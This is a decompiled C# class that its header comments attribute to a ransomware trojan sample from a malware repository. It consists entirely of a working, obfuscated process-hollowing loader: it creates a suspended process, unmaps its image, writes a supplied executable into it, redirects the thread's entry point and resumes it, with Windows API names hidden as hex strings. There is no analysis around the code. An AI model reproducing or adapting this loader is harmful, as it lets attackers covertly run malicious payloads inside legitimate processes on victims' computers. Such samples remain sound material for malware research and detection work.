// Decompiled with JetBrains decompiler
// Type: GMTXgkoxMKfPPprguAuZBnWkDLqvmFFkZNsttlj.RdsFWDOohoRwNJDvkUJxDiAMqlBqgGqfkEcG
// Assembly: DRAT, Version=2.0.4.0, Culture=neutral, PublicKeyToken=null
// MVID: 598F8269-5A45-45F8-8445-F33B178B2B1B
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00010-msil\Trojan-Ransom.Win32.Blocker.ijhl-4052c51fa971089998d252af8a00e6ab263cfd020ae698d30b34275299ba2636.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.IO;
using System.Runtime.InteropServices;

namespace GMTXgkoxMKfPPprguAuZBnWkDLqvmFFkZNsttlj
{
  public sealed class RdsFWDOohoRwNJDvkUJxDiAMqlBqgGqfkEcG : LFsbHAWQYegumkICuthagKgCTIYwhJGcvCWMMT
  {
    private const int CONTEXT_X86 = 65536;
    private const int CONTEXT86_INTEGER = 65538;
    private const string KERNEL32HEX = "0x6b65726e656c3332";
    private const long MEM_COMMIT = 4096;
    private const long MEM_RESERVE = 8192;
    private const string NTDLLHEX = "0x6e74646c6c";
    private const long PAGE_EXECUTE = 16;
    private const long PAGE_EXECUTE_READ = 32;
    private const long PAGE_EXECUTE_READWRITE = 64;
    private const long PAGE_NOACCESS = 1;
    private const uint PAGE_READONLY = 2;
    private const long PAGE_READWRITE = 4;

    private long bedot(long characteristics) => Conversions.ToLong(new object[8]
    {
      (object) 1L,
      (object) 16L,
      (object) 2,
      (object) 32L,
      (object) 4L,
      (object) 64L,
      (object) 4L,
      (object) 64L
    }[(int) this.RShift(characteristics, 29L)]);

    public bool AMrDRPwRhqvUfXtiFwjqTeAsAhPhWrpCmZcOt(
      byte[] BpcnMBVOSgmePVRUusKMoHDSqmedEvUmXslSb,
      string WrIjNIbTwpRllZdPPpmKsYSqHSJvHVfxrBTOE)
    {
      long num1 = 0;
      uint num2 = 0;
      IntPtr zero = IntPtr.Zero;
      RdsFWDOohoRwNJDvkUJxDiAMqlBqgGqfkEcG.QOdHjcSpiAFJrZJmUhmKjfbBbBLqxjBlrrcZpwf bbBlqxjBlrrcZpwf = new RdsFWDOohoRwNJDvkUJxDiAMqlBqgGqfkEcG.QOdHjcSpiAFJrZJmUhmKjfbBbBLqxjBlrrcZpwf();
      RdsFWDOohoRwNJDvkUJxDiAMqlBqgGqfkEcG.vJonUilajpVxImjgiceiOXnxuSNAsisWxoNapmf XEBefZRtuptvTTmNEMZEoAetBTgVgKTjonbpr = new RdsFWDOohoRwNJDvkUJxDiAMqlBqgGqfkEcG.vJonUilajpVxImjgiceiOXnxuSNAsisWxoNapmf();
      RdsFWDOohoRwNJDvkUJxDiAMqlBqgGqfkEcG.LjEFLxaFIupNPvfVRpoxSlgBvxvSZGpuslU vrpoxSlgBvxvSzGpuslU = new RdsFWDOohoRwNJDvkUJxDiAMqlBqgGqfkEcG.LjEFLxaFIupNPvfVRpoxSlgBvxvSZGpuslU();
      RdsFWDOohoRwNJDvkUJxDiAMqlBqgGqfkEcG.QfmvnIqwofECJnGvtdWYDDIJxIbxCtQcYxChD wyddiJxIbxCtQcYxChD = new RdsFWDOohoRwNJDvkUJxDiAMqlBqgGqfkEcG.QfmvnIqwofECJnGvtdWYDDIJxIbxCtQcYxChD();
      RdsFWDOohoRwNJDvkUJxDiAMqlBqgGqfkEcG.HKqfLNqtJhvswMMuaNUatfcrrtMacHlUsCTMg xPQmIgKjuajbhsPGvkZdfNILqncbAeCCNkowTQh = new RdsFWDOohoRwNJDvkUJxDiAMqlBqgGqfkEcG.HKqfLNqtJhvswMMuaNUatfcrrtMacHlUsCTMg();
      RdsFWDOohoRwNJDvkUJxDiAMqlBqgGqfkEcG.nqREupxIsENcXkNbwadxmNBQRxubAuoAOEVc cnPKZkYaLKZKYWOhECrTBejNVeLvEOifDLwqwt = new RdsFWDOohoRwNJDvkUJxDiAMqlBqgGqfkEcG.nqREupxIsENcXkNbwadxmNBQRxubAuoAOEVc();
      RdsFWDOohoRwNJDvkUJxDiAMqlBqgGqfkEcG.mglpjwIKvfwHOBreefapBlvqWFwLKOQMgSKpq GMxNlCncpWEsRXOKtBxntWbWvasHKYTgGQiExR = new RdsFWDOohoRwNJDvkUJxDiAMqlBqgGqfkEcG.mglpjwIKvfwHOBreefapBlvqWFwLKOQMgSKpq();
      RdsFWDOohoRwNJDvkUJxDiAMqlBqgGqfkEcG.mglpjwIKvfwHOBreefapBlvqWFwLKOQMgSKpq IdCUZvRRInBApuGmijbQLIgPRATmwkHIcDpHoCC = new RdsFWDOohoRwNJDvkUJxDiAMqlBqgGqfkEcG.mglpjwIKvfwHOBreefapBlvqWFwLKOQMgSKpq();
      GCHandle gcHandle = GCHandle.Alloc((object) BpcnMBVOSgmePVRUusKMoHDSqmedEvUmXslSb, GCHandleType.Pinned);
      int int32 = gcHandle.AddrOfPinnedObject().ToInt32();
      RdsFWDOohoRwNJDvkUJxDiAMqlBqgGqfkEcG.QOdHjcSpiAFJrZJmUhmKjfbBbBLqxjBlrrcZpwf structure1 = (RdsFWDOohoRwNJDvkUJxDiAMqlBqgGqfkEcG.QOdHjcSpiAFJrZJmUhmKjfbBbBLqxjBlrrcZpwf) Marshal.PtrToStructure(gcHandle.AddrOfPinnedObject(), bbBlqxjBlrrcZpwf.GetType());
      gcHandle.Free();
      if (!((RdsFWDOohoRwNJDvkUJxDiAMqlBqgGqfkEcG.CreateProcessA) this.uCHkOiOwxIqsRApAvvavaZIRYVOSQFmdVkaNdjU("0x6b65726e656c3332", "0x43726561746550726f6365737341", typeof (RdsFWDOohoRwNJDvkUJxDiAMqlBqgGqfkEcG.CreateProcessA)))((string) null, WrIjNIbTwpRllZdPPpmKsYSqHSJvHVfxrBTOE, ref GMxNlCncpWEsRXOKtBxntWbWvasHKYTgGQiExR, ref IdCUZvRRInBApuGmijbQLIgPRATmwkHIcDpHoCC, false, 4U, zero, (string) null, ref cnPKZkYaLKZKYWOhECrTBejNVeLvEOifDLwqwt, out xPQmIgKjuajbhsPGvkZdfNILqncbAeCCNkowTQh))
        return false;
      RdsFWDOohoRwNJDvkUJxDiAMqlBqgGqfkEcG.LjEFLxaFIupNPvfVRpoxSlgBvxvSZGpuslU structure2 = (RdsFWDOohoRwNJDvkUJxDiAMqlBqgGqfkEcG.LjEFLxaFIupNPvfVRpoxSlgBvxvSZGpuslU) Marshal.PtrToStructure(new IntPtr(int32 + structure1.e_lfanew), vrpoxSlgBvxvSzGpuslU.GetType());
      cnPKZkYaLKZKYWOhECrTBejNVeLvEOifDLwqwt.cb = Strings.Len((object) cnPKZkYaLKZKYWOhECrTBejNVeLvEOifDLwqwt);
      XEBefZRtuptvTTmNEMZEoAetBTgVgKTjonbpr.ContextFlags = 65538U;
      if (structure2.Signature != 17744U | structure1.e_magic != (ushort) 23117)
        return false;
      RdsFWDOohoRwNJDvkUJxDiAMqlBqgGqfkEcG.GetThreadContext getThreadContext = (RdsFWDOohoRwNJDvkUJxDiAMqlBqgGqfkEcG.GetThreadContext) this.uCHkOiOwxIqsRApAvvavaZIRYVOSQFmdVkaNdjU("0x6b65726e656c3332", "0x476574546872656164436f6e74657874", typeof (RdsFWDOohoRwNJDvkUJxDiAMqlBqgGqfkEcG.GetThreadContext));
      RdsFWDOohoRwNJDvkUJxDiAMqlBqgGqfkEcG.Re re = (RdsFWDOohoRwNJDvkUJxDiAMqlBqgGqfkEcG.Re) this.uCHkOiOwxIqsRApAvvavaZIRYVOSQFmdVkaNdjU("0x6b65726e656c3332", "0x5265616450726f636573734d656d6f7279", typeof (RdsFWDOohoRwNJDvkUJxDiAMqlBqgGqfkEcG.Re));
      RdsFWDOohoRwNJDvkUJxDiAMqlBqgGqfkEcG.ZwUnmapViewOfSection unmapViewOfSection = (RdsFWDOohoRwNJDvkUJxDiAMqlBqgGqfkEcG.ZwUnmapViewOfSection) this.uCHkOiOwxIqsRApAvvavaZIRYVOSQFmdVkaNdjU("0x6e74646c6c", "0x5a77556e6d6170566965774f6653656374696f6e", typeof (RdsFWDOohoRwNJDvkUJxDiAMqlBqgGqfkEcG.ZwUnmapViewOfSection));
      IntPtr lpbuffer = (IntPtr) num1;
      int VUccvwDPLJFbJKMlNYikuapGHGEeuDjGPNh = 0;
      long num3 = (long) lpbuffer;
      if (!(getThreadContext(xPQmIgKjuajbhsPGvkZdfNILqncbAeCCNkowTQh.hThread, ref XEBefZRtuptvTTmNEMZEoAetBTgVgKTjonbpr) & re(xPQmIgKjuajbhsPGvkZdfNILqncbAeCCNkowTQh.hProcess, (int) ((long) XEBefZRtuptvTTmNEMZEoAetBTgVgKTjonbpr.Ebx + 8L), ref lpbuffer, 4, ref VUccvwDPLJFbJKMlNYikuapGHGEeuDjGPNh) >= 0 & unmapViewOfSection(xPQmIgKjuajbhsPGvkZdfNILqncbAeCCNkowTQh.hProcess, (IntPtr) num3) >= 0L))
        return false;
      uint lpBaseAddress = (uint) (int) ((RdsFWDOohoRwNJDvkUJxDiAMqlBqgGqfkEcG.VirtualAllocEx) this.uCHkOiOwxIqsRApAvvavaZIRYVOSQFmdVkaNdjU("0x6b65726e656c3332", "0x5669727475616c416c6c6f634578", typeof (RdsFWDOohoRwNJDvkUJxDiAMqlBqgGqfkEcG.VirtualAllocEx)))(xPQmIgKjuajbhsPGvkZdfNILqncbAeCCNkowTQh.hProcess, (IntPtr) (long) structure2.OptionalHeader.ImageBase, structure2.OptionalHeader.SizeOfImage, 12288U, 4U);
      if (lpBaseAddress == 0U)
        return false;
      RdsFWDOohoRwNJDvkUJxDiAMqlBqgGqfkEcG.Wr wr1 = (RdsFWDOohoRwNJDvkUJxDiAMqlBqgGqfkEcG.Wr) this.uCHkOiOwxIqsRApAvvavaZIRYVOSQFmdVkaNdjU("0x6b65726e656c3332", "0x577269746550726f636573734d656d6f7279", typeof (RdsFWDOohoRwNJDvkUJxDiAMqlBqgGqfkEcG.Wr));
      int lpNumberOfBytesWritten = (int) num2;
      int num4 = wr1(xPQmIgKjuajbhsPGvkZdfNILqncbAeCCNkowTQh.hProcess, (IntPtr) (long) lpBaseAddress, BpcnMBVOSgmePVRUusKMoHDSqmedEvUmXslSb, (int) structure2.OptionalHeader.SizeOfHeaders, out lpNumberOfBytesWritten) ? 1 : 0;
      uint num5 = (uint) lpNumberOfBytesWritten;
      long num6 = (long) (structure1.e_lfanew + 248);
      int num7 = (int) structure2.FileHeader.NumberOfSections - 1;
      for (int index1 = 0; index1 <= num7; ++index1)
      {
        lpbuffer = new IntPtr((long) int32 + num6 + (long) (index1 * 40));
        wyddiJxIbxCtQcYxChD = (RdsFWDOohoRwNJDvkUJxDiAMqlBqgGqfkEcG.QfmvnIqwofECJnGvtdWYDDIJxIbxCtQcYxChD) Marshal.PtrToStructure(lpbuffer, wyddiJxIbxCtQcYxChD.GetType());
        byte[] lhwiNtuCaZnRoZfsxWtXAlHBTeEPOTfuMITxS = new byte[(int) wyddiJxIbxCtQcYxChD.SizeOfRawData + 1];
        int num8 = (int) ((long) wyddiJxIbxCtQcYxChD.SizeOfRawData - 1L);
        for (int index2 = 0; index2 <= num8; ++index2)
          lhwiNtuCaZnRoZfsxWtXAlHBTeEPOTfuMITxS[index2] = BpcnMBVOSgmePVRUusKMoHDSqmedEvUmXslSb[(int) wyddiJxIbxCtQcYxChD.PointerToRawData + index2];
        RdsFWDOohoRwNJDvkUJxDiAMqlBqgGqfkEcG.Wr wr2 = (RdsFWDOohoRwNJDvkUJxDiAMqlBqgGqfkEcG.Wr) this.uCHkOiOwxIqsRApAvvavaZIRYVOSQFmdVkaNdjU("0x6b65726e656c3332", "0x577269746550726f636573734d656d6f7279", typeof (RdsFWDOohoRwNJDvkUJxDiAMqlBqgGqfkEcG.Wr));
        RdsFWDOohoRwNJDvkUJxDiAMqlBqgGqfkEcG.VirtualProtectEx virtualProtectEx = (RdsFWDOohoRwNJDvkUJxDiAMqlBqgGqfkEcG.VirtualProtectEx) this.uCHkOiOwxIqsRApAvvavaZIRYVOSQFmdVkaNdjU("0x6b65726e656c3332", "0x5669727475616c50726f746563744578", typeof (RdsFWDOohoRwNJDvkUJxDiAMqlBqgGqfkEcG.VirtualProtectEx));
        lpNumberOfBytesWritten = (int) num5;
        int num9 = wr2(xPQmIgKjuajbhsPGvkZdfNILqncbAeCCNkowTQh.hProcess, (IntPtr) (long) (lpBaseAddress + wyddiJxIbxCtQcYxChD.VirtualAddress), lhwiNtuCaZnRoZfsxWtXAlHBTeEPOTfuMITxS, (int) wyddiJxIbxCtQcYxChD.SizeOfRawData, out lpNumberOfBytesWritten) ? 1 : 0;
        num5 = (uint) lpNumberOfBytesWritten;
        int num10 = virtualProtectEx(xPQmIgKjuajbhsPGvkZdfNILqncbAeCCNkowTQh.hProcess, (IntPtr) (long) (lpBaseAddress + wyddiJxIbxCtQcYxChD.VirtualAddress), (UIntPtr) wyddiJxIbxCtQcYxChD.Misc.VirtualSize, (UIntPtr) (ulong) this.bedot((long) wyddiJxIbxCtQcYxChD.Characteristics), (uint) num3);
      }
      byte[] bytes = BitConverter.GetBytes(lpBaseAddress);
      RdsFWDOohoRwNJDvkUJxDiAMqlBqgGqfkEcG.Wr wr3 = (RdsFWDOohoRwNJDvkUJxDiAMqlBqgGqfkEcG.Wr) this.uCHkOiOwxIqsRApAvvavaZIRYVOSQFmdVkaNdjU("0x6b65726e656c3332", "0x577269746550726f636573734d656d6f7279", typeof (RdsFWDOohoRwNJDvkUJxDiAMqlBqgGqfkEcG.Wr));
      lpNumberOfBytesWritten = (int) num5;
      int num11 = wr3(xPQmIgKjuajbhsPGvkZdfNILqncbAeCCNkowTQh.hProcess, (IntPtr) ((long) XEBefZRtuptvTTmNEMZEoAetBTgVgKTjonbpr.Ebx + 8L), bytes, 4, out lpNumberOfBytesWritten) ? 1 : 0;
      XEBefZRtuptvTTmNEMZEoAetBTgVgKTjonbpr.Eax = lpBaseAddress + structure2.OptionalHeader.AddressOfEntryPoint;
      RdsFWDOohoRwNJDvkUJxDiAMqlBqgGqfkEcG.SetThreadContext setThreadContext = (RdsFWDOohoRwNJDvkUJxDiAMqlBqgGqfkEcG.SetThreadContext) this.uCHkOiOwxIqsRApAvvavaZIRYVOSQFmdVkaNdjU("0x6b65726e656c3332", "0x536574546872656164436f6e74657874", typeof (RdsFWDOohoRwNJDvkUJxDiAMqlBqgGqfkEcG.SetThreadContext));
      RdsFWDOohoRwNJDvkUJxDiAMqlBqgGqfkEcG.ResumeThread resumeThread = (RdsFWDOohoRwNJDvkUJxDiAMqlBqgGqfkEcG.ResumeThread) this.uCHkOiOwxIqsRApAvvavaZIRYVOSQFmdVkaNdjU("0x6b65726e656c3332", "0x526573756d65546872656164", typeof (RdsFWDOohoRwNJDvkUJxDiAMqlBqgGqfkEcG.ResumeThread));
      return setThreadContext(xPQmIgKjuajbhsPGvkZdfNILqncbAeCCNkowTQh.hThread, ref XEBefZRtuptvTTmNEMZEoAetBTgVgKTjonbpr) && resumeThread(xPQmIgKjuajbhsPGvkZdfNILqncbAeCCNkowTQh.hThread) > 0U;
    }

    public bool AMrDRPwRhqvUfXtiFwjqTeAsAhPhWrpCmZcOt(
      string QOdHjcSpiAFJrZJmUhmKjfbBbBLqxjBlrrcZpwf,
      string vJonUilajpVxImjgiceiOXnxuSNAsisWxoNapmf)
    {
      bool flag = false;
      return File.Exists(QOdHjcSpiAFJrZJmUhmKjfbBbBLqxjBlrrcZpwf) ? this.AMrDRPwRhqvUfXtiFwjqTeAsAhPhWrpCmZcOt(File.ReadAllBytes(QOdHjcSpiAFJrZJmUhmKjfbBbBLqxjBlrrcZpwf), vJonUilajpVxImjgiceiOXnxuSNAsisWxoNapmf) : flag;
    }

    private long RShift(
      long LjEFLxaFIupNPvfVRpoxSlgBvxvSZGpuslU,
      long QfmvnIqwofECJnGvtdWYDDIJxIbxCtQcYxChD)
    {
      return (long) Math.Round(this.vbLongToULong(LjEFLxaFIupNPvfVRpoxSlgBvxvSZGpuslU) / Math.Pow(2.0, (double) QfmvnIqwofECJnGvtdWYDDIJxIbxCtQcYxChD));
    }

    private double vbLongToULong(long HKqfLNqtJhvswMMuaNUatfcrrtMacHlUsCTMg) => HKqfLNqtJhvswMMuaNUatfcrrtMacHlUsCTMg < 0L ? (double) (HKqfLNqtJhvswMMuaNUatfcrrtMacHlUsCTMg + 4294967296L) : (double) HKqfLNqtJhvswMMuaNUatfcrrtMacHlUsCTMg;

    private struct vJonUilajpVxImjgiceiOXnxuSNAsisWxoNapmf
    {
      public uint ContextFlags;
      public uint Dr0;
      public uint Dr1;
      public uint Dr2;
      public uint Dr3;
      public uint Dr6;
      public uint Dr7;
      public RdsFWDOohoRwNJDvkUJxDiAMqlBqgGqfkEcG.FLOATING_SAVE_AREA FloatSave;
      public uint SegGs;
      public uint SegFs;
      public uint SegEs;
      public uint SegDs;
      public uint Edi;
      public uint Esi;
      public uint Ebx;
      public uint Edx;
      public uint Ecx;
      public uint Eax;
      public uint Ebp;
      public uint Eip;
      public uint SegCs;
      public uint EFlags;
      public uint Esp;
      public uint SegSs;
      [MarshalAs(UnmanagedType.ByValArray, SizeConst = 512)]
      public byte[] ExtendedRegisters;
    }

    private delegate bool CreateProcessA(
      string lpApplicationName,
      string lpCommandLine,
      ref RdsFWDOohoRwNJDvkUJxDiAMqlBqgGqfkEcG.mglpjwIKvfwHOBreefapBlvqWFwLKOQMgSKpq GMxNlCncpWEsRXOKtBxntWbWvasHKYTgGQiExR,
      ref RdsFWDOohoRwNJDvkUJxDiAMqlBqgGqfkEcG.mglpjwIKvfwHOBreefapBlvqWFwLKOQMgSKpq IdCUZvRRInBApuGmijbQLIgPRATmwkHIcDpHoCC,
      bool bInheritHandles,
      uint dwCreationFlags,
      IntPtr lpEnvironment,
      string lpCurrentDirectory,
      [In] ref RdsFWDOohoRwNJDvkUJxDiAMqlBqgGqfkEcG.nqREupxIsENcXkNbwadxmNBQRxubAuoAOEVc cnPKZkYaLKZKYWOhECrTBejNVeLvEOifDLwqwt,
      out RdsFWDOohoRwNJDvkUJxDiAMqlBqgGqfkEcG.HKqfLNqtJhvswMMuaNUatfcrrtMacHlUsCTMg xPQmIgKjuajbhsPGvkZdfNILqncbAeCCNkowTQh);

    private struct FLOATING_SAVE_AREA
    {
      public uint ControlWord;
      public uint StatusWord;
      public uint TagWord;
      public uint ErrorOffset;
      public uint ErrorSelector;
      public uint DataOffset;
      public uint DataSelector;
      [MarshalAs(UnmanagedType.ByValArray, SizeConst = 80)]
      public byte[] RegisterArea;
      public uint Cr0NpxState;
    }

    private delegate bool GetThreadContext(
      IntPtr hThread,
      ref RdsFWDOohoRwNJDvkUJxDiAMqlBqgGqfkEcG.vJonUilajpVxImjgiceiOXnxuSNAsisWxoNapmf XEBefZRtuptvTTmNEMZEoAetBTgVgKTjonbpr);

    private struct IMAGE_DATA_DIRECTORY
    {
      public uint VirtualAddress;
      public uint Size;
    }

    private struct QOdHjcSpiAFJrZJmUhmKjfbBbBLqxjBlrrcZpwf
    {
      public ushort e_magic;
      public ushort e_cblp;
      public ushort e_cp;
      public ushort e_crlc;
      public ushort e_cparhdr;
      public ushort e_minalloc;
      public ushort e_maxalloc;
      public ushort e_ss;
      public ushort e_sp;
      public ushort e_csum;
      public ushort e_ip;
      public ushort e_cs;
      public ushort e_lfarlc;
      public ushort e_ovno;
      [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
      public ushort[] e_res1;
      public ushort e_oemid;
      public ushort e_oeminfo;
      [MarshalAs(UnmanagedType.ByValArray, SizeConst = 10)]
      public ushort[] e_res2;
      public int e_lfanew;
    }

    private struct IMAGE_FILE_HEADER
    {
      public ushort Machine;
      public ushort NumberOfSections;
      public uint TimeDateStamp;
      public uint PointerToSymbolTable;
      public uint NumberOfSymbols;
      public ushort SizeOfOptionalHeader;
      public ushort Characteristics;
    }

    private struct LjEFLxaFIupNPvfVRpoxSlgBvxvSZGpuslU
    {
      public uint Signature;
      public RdsFWDOohoRwNJDvkUJxDiAMqlBqgGqfkEcG.IMAGE_FILE_HEADER FileHeader;
      public RdsFWDOohoRwNJDvkUJxDiAMqlBqgGqfkEcG.IMAGE_OPTIONAL_HEADER32 OptionalHeader;
    }

    private struct IMAGE_OPTIONAL_HEADER32
    {
      public ushort Magic;
      public byte MajorLinkerVersion;
      public byte MinorLinkerVersion;
      public uint SizeOfCode;
      public uint SizeOfInitializedData;
      public uint SizeOfUninitializedData;
      public uint AddressOfEntryPoint;
      public uint BaseOfCode;
      public uint BaseOfData;
      public uint ImageBase;
      public uint SectionAlignment;
      public uint FileAlignment;
      public ushort MajorOperatingSystemVersion;
      public ushort MinorOperatingSystemVersion;
      public ushort MajorImageVersion;
      public ushort MinorImageVersion;
      public ushort MajorSubsystemVersion;
      public ushort MinorSubsystemVersion;
      public uint Win32VersionValue;
      public uint SizeOfImage;
      public uint SizeOfHeaders;
      public uint CheckSum;
      public ushort Subsystem;
      public ushort DllCharacteristics;
      public uint SizeOfStackReserve;
      public uint SizeOfStackCommit;
      public uint SizeOfHeapReserve;
      public uint SizeOfHeapCommit;
      public uint LoaderFlags;
      public uint NumberOfRvaAndSizes;
      [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
      public RdsFWDOohoRwNJDvkUJxDiAMqlBqgGqfkEcG.IMAGE_DATA_DIRECTORY[] DataDirectory;
    }

    private struct QfmvnIqwofECJnGvtdWYDDIJxIbxCtQcYxChD
    {
      public byte Name;
      public RdsFWDOohoRwNJDvkUJxDiAMqlBqgGqfkEcG.Misc Misc;
      public uint VirtualAddress;
      public uint SizeOfRawData;
      public uint PointerToRawData;
      public uint PointerToRelocations;
      public uint PointerToLinenumbers;
      public ushort NumberOfRelocations;
      public ushort NumberOfLinenumbers;
      public uint Characteristics;
    }

    private enum ImageSignatureTypes
    {
      IMAGE_OS2_SIGNATURE_LE = 17740, // 0x0000454C
      IMAGE_VXD_SIGNATURE = 17740, // 0x0000454C
      IMAGE_OS2_SIGNATURE = 17742, // 0x0000454E
      IMAGE_NT_SIGNATURE = 17744, // 0x00004550
      IMAGE_DOS_SIGNATURE = 23117, // 0x00005A4D
    }

    private struct Misc
    {
      public uint PhysicalAddress;
      public uint VirtualSize;
    }

    private struct HKqfLNqtJhvswMMuaNUatfcrrtMacHlUsCTMg
    {
      public IntPtr hProcess;
      public IntPtr hThread;
      public int dwProcessId;
      public int dwThreadId;
    }

    private delegate int Re(
      IntPtr hProcess,
      int lpBaseAddress,
      ref IntPtr lpbuffer,
      int size,
      ref int VUccvwDPLJFbJKMlNYikuapGHGEeuDjGPNh);

    private delegate uint ResumeThread(IntPtr hThread);

    private struct mglpjwIKvfwHOBreefapBlvqWFwLKOQMgSKpq
    {
      public int nLength;
      public IntPtr lpSecurityDescriptor;
      public int bInheritHandle;
    }

    private delegate bool SetThreadContext(
      IntPtr hThread,
      ref RdsFWDOohoRwNJDvkUJxDiAMqlBqgGqfkEcG.vJonUilajpVxImjgiceiOXnxuSNAsisWxoNapmf XEBefZRtuptvTTmNEMZEoAetBTgVgKTjonbpr);

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    private struct nqREupxIsENcXkNbwadxmNBQRxubAuoAOEVc
    {
      public int cb;
      public string lpReserved;
      public string lpDesktop;
      public string lpTitle;
      public int dwX;
      public int dwY;
      public int dwXSize;
      public int dwYSize;
      public int dwXCountChars;
      public int dwYCountChars;
      public int dwFillAttribute;
      public int dwFlags;
      public short wShowWindow;
      public short cbReserved2;
      public int lpReserved2;
      public int hStdInput;
      public int hStdOutput;
      public int hStdError;
    }

    private delegate IntPtr VirtualAllocEx(
      IntPtr hProcess,
      IntPtr lpAddress,
      uint dwSize,
      uint flAllocationType,
      uint flProtect);

    private delegate int VirtualProtectEx(
      IntPtr hProcess,
      IntPtr lpAddress,
      UIntPtr dwSize,
      UIntPtr flNewProtect,
      [Out] uint lpflOldProtect);

    private delegate bool Wr(
      IntPtr hProcess,
      IntPtr lpBaseAddress,
      byte[] lhwiNtuCaZnRoZfsxWtXAlHBTeEPOTfuMITxS,
      int iSize,
      out int lpNumberOfBytesWritten);

    private delegate long ZwUnmapViewOfSection(IntPtr hProcess, IntPtr BaseAddress);
  }
}
